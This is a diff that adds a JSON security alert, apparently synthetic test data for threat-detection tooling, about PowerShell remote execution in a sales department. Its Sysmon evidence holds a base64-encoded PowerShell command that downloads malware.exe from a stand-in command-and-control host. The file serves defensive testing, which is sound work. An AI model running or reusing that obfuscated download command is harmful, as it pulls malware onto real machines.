@@ -1,0 +1,17 @@
+{
+  "title": "PowerShell Variant - Sales Dept",
+  "description": "Variant of PowerShell remote execution detected in Sales department.",
+  "severity": "High",
+  "evidence": [
+    {
+      "source": "Sysmon Event 1",
+      "content": "Process creation: powershell.exe -EncodedCommand IAAgAGMAdQByAGwAIAAtAHMAIABoAHQAdABwADoALwAvAGMAMgAtAHMAZQByAHYAZQByAC4AYwBvAG0ALwBtAGEAbAB3AGEAcgBlAC4AZQB4AGUAIAAtAG8AIABtAGEAbAB3AGEAcgBlAC4AZQB4AGUAIA== user=admin T1059 T1547",
+      "content_type": "log"
+    },
+    {
+      "source": "Network Capture",
+      "content": "Connection from 192.168.1.100 to c2-server.com:80. Downloaded malware.exe DLL Injection T1055",
+      "content_type": "network"
+    }
+  ]
+}
